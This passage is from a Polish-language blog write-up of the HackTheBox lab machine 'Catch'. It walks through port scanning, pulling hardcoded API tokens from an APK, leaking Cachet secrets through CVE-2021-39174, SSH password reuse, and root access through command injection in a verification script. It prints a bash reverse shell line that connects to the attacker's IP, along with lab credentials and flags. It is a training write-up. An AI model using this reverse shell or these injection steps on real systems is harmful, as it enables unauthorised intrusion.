+|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;manifest&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz&#34;</span>                                                                                                                                                                                                                                                                                                                                                                                       
+|   HTTPOptions:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+|     HTTP/1.0 <span style="color:#ae81ff">405</span> Method Not Allowed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+|     Set-Cookie: i_like_gitea<span style="color:#f92672">=</span>4fd37b7163f8237e; Path<span style="color:#f92672">=</span>/; HttpOnly                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+|     Set-Cookie: _csrf<span style="color:#f92672">=</span>7s0raKa3foKwrWIHYinDybDpmhA6MTY1ODg3MzYwMTU0NzE5MzU1Mg; Path<span style="color:#f92672">=</span>/; Expires<span style="color:#f92672">=</span>Wed, <span style="color:#ae81ff">27</span> Jul <span style="color:#ae81ff">2022</span> 22:13:21 GMT; HttpOnly; SameSite<span style="color:#f92672">=</span>Lax         
+|     Set-Cookie: macaron_flash<span style="color:#f92672">=</span>; Path<span style="color:#f92672">=</span>/; Max-Age<span style="color:#f92672">=</span>0; HttpOnly                                                                                                 
+|     X-Frame-Options: SAMEORIGIN                                                                                                                             
+|     Date: Tue, <span style="color:#ae81ff">26</span> Jul <span style="color:#ae81ff">2022</span> 22:13:21 GMT                                                                                                                     
+|_    Content-Length: <span style="color:#ae81ff">0</span>                                                                                                                                       
+5000/tcp open  upnp?                                                                                                                                          
+| fingerprint-strings:                                                                                                                                        
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge:                                                       
+|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request                                                                                                                                
+|     Connection: close                                                                                                                                       
+|   GetRequest:                                                                                                                                               
+|     HTTP/1.1 <span style="color:#ae81ff">302</span> Found                                                                                                                                      
+|     X-Frame-Options: SAMEORIGIN                                                                                                                             
+|     X-Download-Options: noopen                                                                                                                              
+|     X-Content-Type-Options: nosniff                                                                                                                         
+|     X-XSS-Protection: 1; mode<span style="color:#f92672">=</span>block                                                                                                                         
+|     Content-Security-Policy:                                                                                                                                
+|     X-Content-Security-Policy:                                                                                                                              
+|     X-WebKit-CSP:                                                                                                                                           
+|     X-UA-Compatible: IE<span style="color:#f92672">=</span>Edge,chrome<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>                                                                                                                       
+|     Location: /login                                                                                                                                        
+|     Vary: Accept, Accept-Encoding                                                                                                                           
+|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8                                                                                                                 
+|     Content-Length: <span style="color:#ae81ff">28</span>                                                                                                                                      
+|     Set-Cookie: connect.sid<span style="color:#f92672">=</span>s%3AL1AZnkW1AQEa9HvnAHCX55B9tBVAioiX.iGHnhVQ72dbMKiYsuukGBXvh7kh7V6QPkqz199Nxfps; Path<span style="color:#f92672">=</span>/; HttpOnly                              
+|     Date: Tue, <span style="color:#ae81ff">26</span> Jul <span style="color:#ae81ff">2022</span> 22:13:20 GMT                                                                                                                     
+|     Connection: close                                                                                                                                       
+|     Found. Redirecting to /login                                                                                                                            
+|   HTTPOptions:                                                                                                                                              
+|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK                                                                                                                                         
+|     X-Frame-Options: SAMEORIGIN                                                                                                                             
+|     X-Download-Options: noopen                                                                                                                              
+|     X-Content-Type-Options: nosniff                                                                                                                         
+|     X-XSS-Protection: 1; mode<span style="color:#f92672">=</span>block                                                                                                                         
+|     Content-Security-Policy:                                                                                                                                
+|     X-Content-Security-Policy:                                                                                                                              
+|     X-WebKit-CSP:                                                                                                                                           
+|     X-UA-Compatible: IE<span style="color:#f92672">=</span>Edge,chrome<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>                                                                                                                       
+|     Allow: GET,HEAD                                                                                                                                         
+|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8                                                                                                                  
+|     Content-Length: <span style="color:#ae81ff">8</span>                                                                                                                                       
+|     ETag: W/<span style="color:#e6db74">&#34;8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg&#34;</span>                                                                                                                 
+|     Set-Cookie: connect.sid<span style="color:#f92672">=</span>s%3AzSDw9ojr5hWmduJFErbcZTwXFOj6Wuz3.us2lDTLK%2BUW7AHErGSarzAoGhukim%2BdQaIJ7RXJGY2c; Path<span style="color:#f92672">=</span>/; HttpOnly                          
+|     Vary: Accept-Encoding                                                                                                                                   
+|     Date: Tue, <span style="color:#ae81ff">26</span> Jul <span style="color:#ae81ff">2022</span> 22:13:21 GMT                                                                                                                     
+|     Connection: close                                                                                                                                       
+|_    GET,HEAD                                                                                                                                                
+8000/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>                                                                                                         
+|_http-title: Catch Global Systems                                                                                                                            
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</code></pre></div><hr>
+<h1 id="feroxbuster">Feroxbuster<a hidden class="anchor" aria-hidden="true" href="#feroxbuster">#</a></h1>
+<p>Na tej maszynie mamy wiele otwartych portów z HTTP. Jednak Feroxbuster nie znalazł dla żadnej z nich żadnych konkretnych informacji.</p>
+<hr>
+<h1 id="strona-główna-port-80">Strona główna (port 80)<a hidden class="anchor" aria-hidden="true" href="#strona-główna-port-80">#</a></h1>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220727170214.png" alt=""  />
+</p>
+<p>Nic konkretnego nie ma na tej stronie, poza małym szczegółem. Pomarańczowym przyciskiem <code>Download Now</code> możemy pobrać pliczek <code>.apk</code>. Kiedyś bawiłem się w różne CTFy i mam już pewne obycie co należy robić i gdzie szukać w apce mobilnej. Zabrałem się za narzędzia <code>jadx</code> oraz <code>apktool</code>. Jeszcze tylko wspomnę, że na porcie <code>3000</code> mamy <code>Gitea 1.14.1</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220727171230.png" alt=""  />
+</p>
+<p>Na porcie <code>5000</code> jest usługa <code>Lets Chat</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220727171252.png" alt=""  />
+</p>
+<p>A na porcie <code>8000</code> mamy <code>Cachet</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220727171413.png" alt=""  />
+</p>
+<hr>
+<h2 id="jadx">jadx<a hidden class="anchor" aria-hidden="true" href="#jadx">#</a></h2>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220727003212.png" alt=""  />
+
+W głównej funkcji znalazłem ciekawy odnośnik do <code>https://status.catch.htb</code>, zatem od razu dodaję do <code>/etc/hosts</code> wpisy <code>catch.htb</code> <code>status.catch.htb</code>. Znalazłem również w <code>/res/values/strings.xml</code> ciekawe tokeny. Pokrywają się one z tym, co mamy na poszczególnych portach.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220727125743.png" alt=""  />
+</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220727125750.png" alt=""  />
+</p>
+<p>Spis wszystkich tokenów:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">&lt;string name=&#34;gitea_token&#34;&gt;b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0&lt;/string&gt;
+&lt;string name=&#34;lets_chat_token&#34;&gt;NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&lt;/string&gt;
+&lt;string name=&#34;slack_token&#34;&gt;xoxp-23984754863-2348975623103&lt;/string&gt;
+</code></pre></div><hr>
+<p>Token od <code>Gitea</code> nie chciał działać poprawnie więc przeszedłem do kolejnej usługi, czyli do <code>Lets Chat</code>.</p>
+<h2 id="lets_chat_token">lets_chat_token<a hidden class="anchor" aria-hidden="true" href="#lets_chat_token">#</a></h2>
+<p>Token jest w formie <code>Base64</code>. Deszyfrowanie go nie daje żadnych konkretnych informacji.</p>
+<p><code>NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</code></p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220727144655.png" alt=""  />
+</p>
+<p>Nie wiedziałem, jak należy użyć <code>Bearer Token</code>, ale po szybkim wygooglowaniu znalazłem informacje.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220727144739.png" alt=""  />
+</p>
+<p>Zatem mamy zapytanie poprzez <code>curl</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/htb/catch<span style="color:#f92672">]</span>                                                                                                                                
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$curl http://catch.htb:5000/rooms -H <span style="color:#e6db74">&#34;Accept: application/json&#34;</span> -H <span style="color:#e6db74">&#34;Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNT
+</span><span style="color:#e6db74">dmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&#34;</span>                                                                                                                       
+<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;61b86b28d984e2451036eb17&#34;</span>,<span style="color:#e6db74">&#34;slug&#34;</span>:<span style="color:#e6db74">&#34;status&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Status&#34;</span>,<span style="color:#e6db74">&#34;description&#34;</span>:<span style="color:#e6db74">&#34;Cachet Updates and Maintenance&#34;</span>,<span style="color:#e6db74">&#34;lastActive&#34;</span>:<span style="color:#e6db74">&#34;2021-12-14T10:34:20.749Z&#34;</span>,<span style="color:#e6db74">&#34;crea
+</span><span style="color:#e6db74">ted&#34;</span>:<span style="color:#e6db74">&#34;2021-12-14T10:00:08.384Z&#34;</span>,<span style="color:#e6db74">&#34;owner&#34;</span>:<span style="color:#e6db74">&#34;61b86aead984e2451036eb16&#34;</span>,<span style="color:#e6db74">&#34;private&#34;</span>:false,<span style="color:#e6db74">&#34;hasPassword&#34;</span>:false,<span style="color:#e6db74">&#34;participants&#34;</span>:<span style="color:#f92672">[]}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;61b8708efe190b466d476bfb&#34;</span>,<span style="color:#e6db74">&#34;sl
+</span><span style="color:#e6db74">ug&#34;</span>:<span style="color:#e6db74">&#34;android_dev&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Android Development&#34;</span>,<span style="color:#e6db74">&#34;description&#34;</span>:<span style="color:#e6db74">&#34;Android App Updates, Issues &amp; More&#34;</span>,<span style="color:#e6db74">&#34;lastActive&#34;</span>:<span style="color:#e6db74">&#34;2021-12-14T10:24:21.145Z&#34;</span>,<span style="color:#e6db74">&#34;created&#34;</span>:<span style="color:#e6db74">&#34;2021-12-1
+</span><span style="color:#e6db74">4T10:23:10.474Z&#34;</span>,<span style="color:#e6db74">&#34;owner&#34;</span>:<span style="color:#e6db74">&#34;61b86aead984e2451036eb16&#34;</span>,<span style="color:#e6db74">&#34;private&#34;</span>:false,<span style="color:#e6db74">&#34;hasPassword&#34;</span>:false,<span style="color:#e6db74">&#34;participants&#34;</span>:<span style="color:#f92672">[]}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;61b86b3fd984e2451036eb18&#34;</span>,<span style="color:#e6db74">&#34;slug&#34;</span>:<span style="color:#e6db74">&#34;employees&#34;</span>
+,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Employees&#34;</span>,<span style="color:#e6db74">&#34;description&#34;</span>:<span style="color:#e6db74">&#34;New Joinees, Org updates&#34;</span>,<span style="color:#e6db74">&#34;lastActive&#34;</span>:<span style="color:#e6db74">&#34;2021-12-14T10:18:04.710Z&#34;</span>,<span style="color:#e6db74">&#34;created&#34;</span>:<span style="color:#e6db74">&#34;2021-12-14T10:00:31.043Z&#34;</span>,<span style="color:#e6db74">&#34;owner&#34;</span>:<span style="color:#e6db74">&#34;61b86aead98
+</span><span style="color:#e6db74">4e2451036eb16&#34;</span>,<span style="color:#e6db74">&#34;private&#34;</span>:false,<span style="color:#e6db74">&#34;hasPassword&#34;</span>:false,<span style="color:#e6db74">&#34;participants&#34;</span>:<span style="color:#f92672">[]}]</span>
+</code></pre></div><p>Dla wygody warto użyć <code>jq</code>, który przedstawi output w czytelnej formie.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/htb/catch<span style="color:#f92672">]</span>
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$curl http://catch.htb:5000/rooms -s -H <span style="color:#e6db74">&#34;Accept: application/json&#34;</span> -H <span style="color:#e6db74">&#34;Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&#34;</span> | jq .
+<span style="color:#f92672">[</span>
+  <span style="color:#f92672">{</span>
+    <span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;61b86b28d984e2451036eb17&#34;</span>,
+    <span style="color:#e6db74">&#34;slug&#34;</span>: <span style="color:#e6db74">&#34;status&#34;</span>,
+    <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Status&#34;</span>,
+    <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Cachet Updates and Maintenance&#34;</span>,
+    <span style="color:#e6db74">&#34;lastActive&#34;</span>: <span style="color:#e6db74">&#34;2021-12-14T10:34:20.749Z&#34;</span>,
+    <span style="color:#e6db74">&#34;created&#34;</span>: <span style="color:#e6db74">&#34;2021-12-14T10:00:08.384Z&#34;</span>,
+    <span style="color:#e6db74">&#34;owner&#34;</span>: <span style="color:#e6db74">&#34;61b86aead984e2451036eb16&#34;</span>,
+    <span style="color:#e6db74">&#34;private&#34;</span>: false,
+    <span style="color:#e6db74">&#34;hasPassword&#34;</span>: false,
+    <span style="color:#e6db74">&#34;participants&#34;</span>: <span style="color:#f92672">[]</span>
+  <span style="color:#f92672">}</span>,
+  <span style="color:#f92672">{</span>
+    <span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;61b8708efe190b466d476bfb&#34;</span>,
+    <span style="color:#e6db74">&#34;slug&#34;</span>: <span style="color:#e6db74">&#34;android_dev&#34;</span>,
+    <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Android Development&#34;</span>,
+    <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Android App Updates, Issues &amp; More&#34;</span>,
+    <span style="color:#e6db74">&#34;lastActive&#34;</span>: <span style="color:#e6db74">&#34;2021-12-14T10:24:21.145Z&#34;</span>,
+    <span style="color:#e6db74">&#34;created&#34;</span>: <span style="color:#e6db74">&#34;2021-12-14T10:23:10.474Z&#34;</span>,
+    <span style="color:#e6db74">&#34;owner&#34;</span>: <span style="color:#e6db74">&#34;61b86aead984e2451036eb16&#34;</span>,
+    <span style="color:#e6db74">&#34;private&#34;</span>: false,
+    <span style="color:#e6db74">&#34;hasPassword&#34;</span>: false,
+    <span style="color:#e6db74">&#34;participants&#34;</span>: <span style="color:#f92672">[]</span>
+  <span style="color:#f92672">}</span>,
+  <span style="color:#f92672">{</span>
+    <span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;61b86b3fd984e2451036eb18&#34;</span>,
+    <span style="color:#e6db74">&#34;slug&#34;</span>: <span style="color:#e6db74">&#34;employees&#34;</span>,
+    <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Employees&#34;</span>,
+    <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;New Joinees, Org updates&#34;</span>,
+    <span style="color:#e6db74">&#34;lastActive&#34;</span>: <span style="color:#e6db74">&#34;2021-12-14T10:18:04.710Z&#34;</span>,
+    <span style="color:#e6db74">&#34;created&#34;</span>: <span style="color:#e6db74">&#34;2021-12-14T10:00:31.043Z&#34;</span>,
+    <span style="color:#e6db74">&#34;owner&#34;</span>: <span style="color:#e6db74">&#34;61b86aead984e2451036eb16&#34;</span>,
+    <span style="color:#e6db74">&#34;private&#34;</span>: false,
+    <span style="color:#e6db74">&#34;hasPassword&#34;</span>: false,
+    <span style="color:#e6db74">&#34;participants&#34;</span>: <span style="color:#f92672">[]</span>
+  <span style="color:#f92672">}</span>
+<span style="color:#f92672">]</span>
+</code></pre></div><p>Mamy również użytkowników -&gt; <code>admin</code>, <code>john</code>, <code>will</code>, <code>lucas</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/htb/catch<span style="color:#f92672">]</span>                                                  
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$curl -s http://catch.htb:5000/users -H <span style="color:#e6db74">&#34;Accept: application/json&#34;</span> -H <span style="color:#e6db74">&#34;Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&#34;</span> | jq .                                
+<span style="color:#f92672">[</span>                                                                               
+  <span style="color:#f92672">{</span>                                                                             
+    <span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;61b86aead984e2451036eb16&#34;</span>,                                           
+    <span style="color:#e6db74">&#34;firstName&#34;</span>: <span style="color:#e6db74">&#34;Administrator&#34;</span>,                                               
+    <span style="color:#e6db74">&#34;lastName&#34;</span>: <span style="color:#e6db74">&#34;NA&#34;</span>,                                                           
+    <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>,                                                        
+    <span style="color:#e6db74">&#34;displayName&#34;</span>: <span style="color:#e6db74">&#34;Admin&#34;</span>,                                                     
+    <span style="color:#e6db74">&#34;avatar&#34;</span>: <span style="color:#e6db74">&#34;e2b5310ec47bba317c5f1b5889e96f04&#34;</span>,                               
+    <span style="color:#e6db74">&#34;openRooms&#34;</span>: <span style="color:#f92672">[</span>                                                              
+      <span style="color:#e6db74">&#34;61b86b28d984e2451036eb17&#34;</span>,              
+      <span style="color:#e6db74">&#34;61b86b3fd984e2451036eb18&#34;</span>,              
+      <span style="color:#e6db74">&#34;61b8708efe190b466d476bfb&#34;</span>               
+    <span style="color:#f92672">]</span>                                          
+  <span style="color:#f92672">}</span>,                                                                                           
+  <span style="color:#f92672">{</span>                                            
+    <span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;61b86dbdfe190b466d476bf0&#34;</span>,          
+    <span style="color:#e6db74">&#34;firstName&#34;</span>: <span style="color:#e6db74">&#34;John&#34;</span>,                       
+    <span style="color:#e6db74">&#34;lastName&#34;</span>: <span style="color:#e6db74">&#34;Smith&#34;</span>,                       
+    <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;john&#34;</span>,                        
+    <span style="color:#e6db74">&#34;displayName&#34;</span>: <span style="color:#e6db74">&#34;John&#34;</span>,                     
+    <span style="color:#e6db74">&#34;avatar&#34;</span>: <span style="color:#e6db74">&#34;f5504305b704452bba9c94e228f271c4&#34;</span>,                                                                      
+    <span style="color:#e6db74">&#34;openRooms&#34;</span>: <span style="color:#f92672">[</span>                             
+      <span style="color:#e6db74">&#34;61b86b3fd984e2451036eb18&#34;</span>,              
+      <span style="color:#e6db74">&#34;61b86b28d984e2451036eb17&#34;</span>               
+    <span style="color:#f92672">]</span>                                          
+  <span style="color:#f92672">}</span>,                                                                                           
+  <span style="color:#f92672">{</span>                                            
+    <span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;61b86e40fe190b466d476bf2&#34;</span>,          
+    <span style="color:#e6db74">&#34;firstName&#34;</span>: <span style="color:#e6db74">&#34;Will&#34;</span>,                       
+    <span style="color:#e6db74">&#34;lastName&#34;</span>: <span style="color:#e6db74">&#34;Robinson&#34;</span>,                    
+    <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;will&#34;</span>,                        
+    <span style="color:#e6db74">&#34;displayName&#34;</span>: <span style="color:#e6db74">&#34;Will&#34;</span>,                     
+    <span style="color:#e6db74">&#34;avatar&#34;</span>: <span style="color:#e6db74">&#34;7c6143461e935a67981cc292e53c58fc&#34;</span>,                                                                      
+    <span style="color:#e6db74">&#34;openRooms&#34;</span>: <span style="color:#f92672">[</span>                                         
+      <span style="color:#e6db74">&#34;61b86b3fd984e2451036eb18&#34;</span>,                          
+      <span style="color:#e6db74">&#34;61b86b28d984e2451036eb17&#34;</span>                           
+    <span style="color:#f92672">]</span>                                                      
+  <span style="color:#f92672">}</span>,                                                       
+  <span style="color:#f92672">{</span>                                                        
+    <span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;61b86f15fe190b466d476bf5&#34;</span>,                               
+    <span style="color:#e6db74">&#34;firstName&#34;</span>: <span style="color:#e6db74">&#34;Lucas&#34;</span>,                                           
+    <span style="color:#e6db74">&#34;lastName&#34;</span>: <span style="color:#e6db74">&#34;NA&#34;</span>,                                               
+    <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;lucas&#34;</span>,                                            
+    <span style="color:#e6db74">&#34;displayName&#34;</span>: <span style="color:#e6db74">&#34;Lucas&#34;</span>,                                         
+    <span style="color:#e6db74">&#34;avatar&#34;</span>: <span style="color:#e6db74">&#34;b36396794553376673623dc0f6dec9bb&#34;</span>,                                                                                       
+    <span style="color:#e6db74">&#34;openRooms&#34;</span>: <span style="color:#f92672">[</span>                                                  
+      <span style="color:#e6db74">&#34;61b86b28d984e2451036eb17&#34;</span>,                                   
+      <span style="color:#e6db74">&#34;61b86b3fd984e2451036eb18&#34;</span>                                    
+    <span style="color:#f92672">]</span>                                                               
+  <span style="color:#f92672">}</span>                                                                 
+<span style="color:#f92672">]</span>
+</code></pre></div><p>Zgodnie z Githubem <code>Lets Chat</code> możemy podejrzeć wiadomości w poszczególnych pokojach.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220728012351.png" alt=""  />
+</p>
+<p>W jednej z rozmów pojawiają się dane dostępowe do <code>status.catch.htb</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220728012623.png" alt=""  />
+
+<code>john :  E}V!mywu_69T4C}W</code></p>
+<p>Udało się zalogować na <code>Cachet</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220728013004.png" alt=""  />
+</p>
+<p>W opcjach widoczna jest wersja <code>2.4.0-dev</code>
+<img loading="lazy" src="../../../screenshots/Pasted%20image%2020220728015115.png" alt=""  />
+</p>
+<p>Wersja <code>2.4.0-dev</code> ma trzy podatności. Są one opisane w tym poście <a href="https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/">https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/</a>. Ja postanowiłem spróbować sił z <code>CVE-2021-39174</code> czyli z wyciekiem danych konfiguracyjnych z pliku <code>.env</code>. Szczególnie interesowałyby nas te:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">APP_KEY
+DB_PASSWORD
+MAIL_PASSWORD
+</code></pre></div><p>Po wprowadzeniu zmiennych należy zapisać <code>Save</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220728152825.png" alt=""  />
+</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220728152830.png" alt=""  />
+</p>
+<p>A tutaj mamy efekt po odświeżeniu strony. Oto wyciek z pierwszej zmiennej <code>APP_KEY</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220728152836.png" alt=""  />
+</p>
+<p>Otrzymałem następujące dane wykorzystując 3 zmienne:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">${APP_KEY} -&gt; base64:9mUxJeOqzwJdByidmxhbJaa74xh3ObD79OI6oG1KgyA=
+${DB_PASSWORD} -&gt; s2#4Fg0_%3!
+${MAIL_PASSWORD} -&gt; tutaj nic nie otrzymałem
+</code></pre></div><p>Mam hasło, jest to jakiś punkt zaczepienia. Sprawdziłem hasło na SSH dla wszystkich userów, którzy są powyżej.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220728153753.png" alt=""  />
+</p>
+<p>Udało się zalogować na usera <code>will</code> 😊</p>
+<p>user.txt</p>
+<p><code>960e9c3b788ec10ec267423976478c4c</code></p>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1>
+<p>Nietypowy skrypt w <code>/opt/mdm/verify.sh</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220728235301.png" alt=""  />
+</p>
+<p>Jak się okazuje, jest to skrypt, który przeprowadza szereg działań na plikach<code>.apk</code>.</p>
+<p>Sprawdziłem również <code>pspy64</code>. Co jakiś czas box uruchamia pewien plik.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">2022/07/28 19:30:05 CMD: UID=0    PID=348041 | /bin/bash /root/check.sh
+</code></pre></div><p>Z eskalacją miałem małe zacięcie. Na forum <code>HackTheBox</code>, niektóre osoby wspominały, żeby zacząć sprawdzanie skryptu od końca. Zatem warto spojrzeć na ostatnią funkcję <code>app_check</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220728235218.png" alt=""  />
+
+Podatne na Command Injection wydaje się fragment z <code>echo -n $APP_NAME</code>. Należy tylko pamiętać, że trzeba zachować fragment <code>Catch</code>, aby warunek był prawdziwy. Następnie w linii poniżej po <code>echo -n</code> a przed <code>xargs -I ... </code> możemy umieścić swoje komendy.</p>
+<p>Dlatego sprawdziłem, czy box spróbuje pobrać plik test z mojego serwera www.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220729021831.png" alt=""  />
+
+Aby skrypt działał należy umieścić go w <code>/opt/mdm/apk_bin</code>.
+<img loading="lazy" src="../../../screenshots/Pasted%20image%2020220729021844.png" alt=""  />
+</p>
+<p>Jak się okazało maszyna pobrała mój plik. Zatem przygotowuje reverse shella.</p>
+<p>Stworzyłem plik <code>test</code> i umieściłem tam reverse shell bash TCP.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/10.10.14.171/9001 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</code></pre></div><p>Następnie skopiowałem plik do <code>/opt/mdm/apk_bin</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp /tmp/p/catch1.0_mod.apk /opt/mdm/apk_bin
+</code></pre></div><p>Po chwili root uruchomił skrypt, a my dostaliśmy połączenie na porcie 9001.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220729021853.png" alt=""  />
+</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220729024359.png" alt=""  />
+</p>
+<p>root.txt
+<code>16ebe688e18abf71cf45d0a2887ec566</code></p>
+<hr>
+<h2 id="roof-proof">Roof proof<a hidden class="anchor" aria-hidden="true" href="#roof-proof">#</a></h2>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220729023240.png" alt=""  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://suszczyk.github.io/tags/linux/">Linux</a></li>
